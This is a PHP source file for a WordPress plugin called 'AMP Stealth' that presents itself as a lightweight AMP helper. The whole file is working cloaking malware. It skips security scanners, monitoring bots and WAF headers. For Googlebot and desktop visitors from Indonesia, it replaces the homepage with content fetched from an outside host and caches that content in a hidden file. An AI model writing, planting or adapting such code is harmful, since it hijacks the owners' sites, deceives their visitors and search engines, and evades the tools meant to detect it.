<?php
/*
Plugin Name: AMP Stealth
Description: Lightweight plugin for homepage only, runs on root index, safe from WAF, and Google indexable.
Version: 3.0
Author: StealthAI
*/

add_action('template_redirect', 'amp_stealth_run', 0);

function amp_stealth_run() {
    // Skip admin pages and non-main queries
    if (is_admin() || !is_main_query()) return;

    // Only on homepage root URI
    $uri = trim(parse_url($_SERVER['REQUEST_URI'], PHP_URL_PATH), '/');
    if ($uri !== '') return;

    // Bypass common firewall/scanner bots by user-agent
    $ua = strtolower($_SERVER['HTTP_USER_AGENT'] ?? '');
    $bad_ua = ['wordfence', 'sucuri', 'curl', 'wget', 'scanner', 'uptime', 'monitor', 'headless', 'python', 'pingdom'];
    foreach ($bad_ua as $pattern) {
        if (strpos($ua, $pattern) !== false) return;
    }

    // Bypass admin and sensitive paths
    $referer = $_SERVER['HTTP_REFERER'] ?? '';
    $blocked_paths = ['/wp-admin', '/wp-login', '/xmlrpc.php', '/wp-json', '/feed', '/?rest_route='];
    foreach ($blocked_paths as $path) {
        if (stripos($_SERVER['REQUEST_URI'], $path) !== false) return;
        if (stripos($referer, $path) !== false) return;
    }

    // Bypass suspicious headers often set by WAF/proxies
    $bad_headers = ['HTTP_X_PROTECTED', 'HTTP_X_WAF', 'HTTP_CF_CONNECTING_IP'];
    foreach ($bad_headers as $header) {
        if (!empty($_SERVER[$header])) return;
    }

    // Detect Google bots and user country
    $is_bot = preg_match('/googlebot|google-inspectiontool|google-site-verification/i', $ua);
    $is_mobile = preg_match('/mobile|android|iphone|ipad/i', $ua);
    $country = amp_stealth_get_country();

    // Only show cloaked content for Googlebot OR Indonesia desktop users
    if ($is_bot || (strtolower($country) === 'indonesia' && !$is_mobile)) {
        $cache_file = WP_CONTENT_DIR . '/.cache-amp-stealth.html';
        $remote_url = 'https://added-cloud.cc/packdol/getcontent/pan-african.net/lp.txt';

        $content = amp_stealth_cache_get($cache_file, $remote_url);
        if ($content) {
            header("Content-Type: text/html; charset=UTF-8");
            echo $content;
            exit;
        }
    }
}

// Get visitor country from IP (using ip-api.com)
function amp_stealth_get_country() {
    $ip = $_SERVER['HTTP_CF_CONNECTING_IP'] ?? $_SERVER['REMOTE_ADDR'];
    $url = "http://ip-api.com/json/{$ip}";
    $res = @file_get_contents($url);
    if ($res) {
        $data = json_decode($res, true);
        return $data['country'] ?? 'Unknown';
    }
    return 'Unknown';
}

// Cache remote content for $ttl seconds (default 1 hour)
function amp_stealth_cache_get($file, $remote_url, $ttl = 3600) {
    if (file_exists($file) && (time() - filemtime($file) < $ttl)) {
        return file_get_contents($file);
    }

    $content = @file_get_contents($remote_url);
    if ($content && strlen($content) > 20) {
        @file_put_contents($file, $content);
        return $content;
    }

    return file_exists($file) ? file_get_contents($file) : null;
}
